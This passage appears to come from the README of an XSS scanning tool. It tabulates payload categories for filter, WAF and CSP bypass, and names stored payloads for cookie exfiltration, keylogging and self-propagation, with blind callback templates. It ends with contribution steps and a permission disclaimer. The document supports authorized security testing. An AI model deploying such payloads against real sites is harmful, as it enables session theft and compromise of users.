```

---

## 🏗️ Payload Categories (810+ total)

| Category | Count | Purpose |
|----------|-------|---------|
| BASIC_PAYLOADS | 85 | Standard `<script>`, `<img>`, `<svg>`, `<body>` tags |
| ENCODING_PAYLOADS | 50 | HTML entities, URL encode, Unicode, Base64, fromCharCode |
| WAF_BYPASS_PAYLOADS | 73 | throw/onerror, Function(), setTimeout, eval variants |
| ATTRIBUTE_ESCAPE | 93 | Every event handler for double/single/unquoted attrs |
| SCRIPT_ESCAPE | 43 | Break out of JS strings, template literals, JSONP |
| COMMENT_ESCAPE | 15 | HTML/JS comment breakout, CDATA |
| DOM_PAYLOADS | 30 | location, document.write, innerHTML, postMessage |
| SVG_PAYLOADS | 32 | SVG animate, foreignObject, use, image events |
| EVENT_HANDLER_PAYLOADS | 96 | Every mouse/keyboard/focus/drag/touch/pointer/media event |
| POLYGLOT_PAYLOADS | 21 | Multi-context payloads that work everywhere |
| CSS_PAYLOADS | 21 | expression(), @import, animation, transition |
| TEMPLATE_INJECTION | 29 | AngularJS, Vue, Jinja2, Twig, FreeMarker, ERB |
| PROTOCOL_PAYLOADS | 42 | javascript:/vbscript:/data: URI tricks |
| MUTATION_PAYLOADS | 31 | mXSS, parser quirks, CDATA, IE conditional |
| FILTER_BYPASS_PAYLOADS | 48 | Bypass keyword filters, recursive stripping |
| NULL_BYTE_PAYLOADS | 21 | Null byte in tags, attrs, protocol strings |
| STORED_XSS_PAYLOADS | 19 | Cookie exfil, keylogger, CSRF, self-propagating |
| BLIND_TEMPLATES | 21 | Callback via fetch/Image/sendBeacon/script src |
| **CSP_BYPASS_PAYLOADS** | **19** | **JSONP CDN abuse, import maps, Trusted Types, base-uri, blob/worker** |
| **MODERN_FRAMEWORK_PAYLOADS** | **22** | **React, Vue 3, Alpine.js, htmx, Svelte, jQuery, Web Components, postMessage** |

---

## 🤝 Contributing

1. Fork: `Vishal-HaCkEr1910/Python_Cybersec_Projects`
2. Add payloads to the relevant lists in `xss_scanner.py`
3. Test on `http://testphp.vulnweb.com/`
4. Submit a PR to `master`

---

## 📚 Resources

| Resource | Link |
|----------|------|
| OWASP XSS Guide | https://owasp.org/www-community/attacks/xss/ |
| PortSwigger XSS Labs | https://portswigger.net/web-security/cross-site-scripting |
| XSS Cheat Sheet | https://portswigger.net/web-security/cross-site-scripting/cheat-sheet |

---

*XSS Hunter Pro v3.0 — Built by Vishal | Only use on systems you have explicit permission to test.*
